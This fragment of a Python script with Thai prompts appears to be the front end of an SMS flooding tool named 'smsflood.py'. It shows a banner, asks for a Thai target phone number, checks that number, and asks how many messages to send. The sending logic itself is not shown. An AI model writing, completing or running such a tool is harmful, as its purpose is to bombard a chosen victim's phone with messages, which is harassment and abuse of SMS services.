...
async def home():
   ...
   ╰━━━┻━━━┻╯╰━┻╯╱╰┻╯╰━┻╯╰━┻━━╯╱╰╯
    ''')
	print()
	phone = input(" \x1b[95mเบอร์เป้าหมาย  /> \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ Error ]\x1b[00m : \x1b[91mโปรดใส่เบอร์ประเทศไทย [ ! ] \x1b[00m')
		time.sleep(2)
		os.system('clear')
		os.system("python smsflood.py")
	else:
		jam = int(input("\x1b[95m จำนวน /> \x1b[92m"))
		print()
		print()
